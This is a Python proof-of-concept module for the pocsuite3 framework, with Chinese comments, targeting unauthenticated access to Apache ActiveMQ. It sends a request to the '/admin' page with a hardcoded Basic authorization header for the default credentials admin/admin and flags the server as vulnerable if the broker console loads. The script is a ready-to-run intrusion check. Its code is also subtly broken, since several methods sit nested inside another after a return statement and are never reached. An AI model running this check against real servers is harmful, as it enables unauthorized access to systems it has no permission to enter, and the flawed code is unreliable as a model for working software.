"""
作者 charis
时间 2023-1-16
注意 poc默认口令使用的是admin/admin
"""
import time
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '6'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-06'
    updateDate = '2023-01-06'
    references = ['https://www.cnblogs.com/ffx1/p/12653629.html']
    name = 'Active mq 未授权访问漏洞'
    appPowerLink = 'https://activemq.apache.org/'
    appName = 'Active MQ'
    appVersion = 'version all'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):

        payloads = [
            r"/admin",
        ]

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1",
                "Authorization": "Basic YWRtaW46YWRtaW4="
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    flag = "Broker"
                    if flag in r.text:
                        return url, payload
            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


